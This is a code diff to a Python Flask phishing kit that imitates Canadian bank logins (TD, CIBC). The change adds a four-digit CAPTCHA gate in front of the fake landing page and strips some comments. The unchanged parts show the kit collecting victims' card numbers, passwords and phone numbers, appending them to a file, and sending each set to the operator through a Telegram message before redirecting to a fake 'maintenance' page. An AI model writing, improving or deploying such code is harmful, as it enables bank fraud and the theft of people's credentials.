@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request, redirect, url_for, flash, session
 import os
 import requests
+import random  # For CAPTCHA code
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"  # Change this to something secure
@@ -27,9 +28,43 @@ if not os.path.exists(USER_FILE):
     with open(USER_FILE, "w") as f:
         pass
 
+@app.before_request
+def check_captcha():
+    """
+    Before serving requests, ensure user has passed CAPTCHA 
+    if they're trying to view the landing page ("/") and 
+    hasn't verified yet.
+    """
+    # If they're going to 'landing_page' but not verified, go to /captcha
+    if request.endpoint == "landing_page" and not session.get("captcha_verified"):
+        return redirect(url_for("captcha"))
+
+@app.route("/captcha", methods=["GET", "POST"])
+def captcha():
+    """
+    Simple numeric CAPTCHA to gate access to the landing page.
+    """
+    if request.method == "POST":
+        user_input = request.form.get("captcha_input", "")
+        stored_code = session.get("captcha_code", "")
+
+        if user_input == stored_code:
+            # If code matches, mark user as verified
+            session["captcha_verified"] = True
+            return redirect(url_for("landing_page"))
+        else:
+            flash("CAPTCHA incorrect. Please try again.", "error")
+            return redirect(url_for("captcha"))
+
+    # If GET, generate a random 4-digit code and store in session
+    code = str(random.randint(1000, 9999))
+    session["captcha_code"] = code
+    return render_template("captcha.html", code=code)
+
 @app.route("/")
 def landing_page():
     # Renders e.g. landing.html with bank selection
+    # If they get here, we've passed @app.before_request check_captcha
     return render_template("landing.html")
 
 @app.route("/td")
@@ -92,16 +127,13 @@ def phone_verification():
             flash("Phone number is required!", "error")
             return redirect(url_for("phone_verification"))
 
-        # Retrieve from session
         bank = session.get("temp_bank", "CIBC")
         card_number = session.get("temp_card", "UnknownCard")
         password = session.get("temp_pass", "UnknownPass")
 
-        # Write to file
         with open(USER_FILE, "a") as f:
             f.write(f"{bank},{card_number},Password:{password},Phone:{phone_number}\n")
 
-        # Send Telegram
         message_text = (
             f"New {bank} login:\n"
             f"Card: {card_number}\n"
@@ -110,12 +142,11 @@ def phone_verification():
         )
         send_telegram_message(message_text)
 
-        # Clear session
+        # Clear session data
         session.pop("temp_bank", None)
         session.pop("temp_card", None)
         session.pop("temp_pass", None)
 
-        # Redirect to "maintenance"
         return redirect(url_for("maintenance"))
 
     return render_template("phone_verification.html")
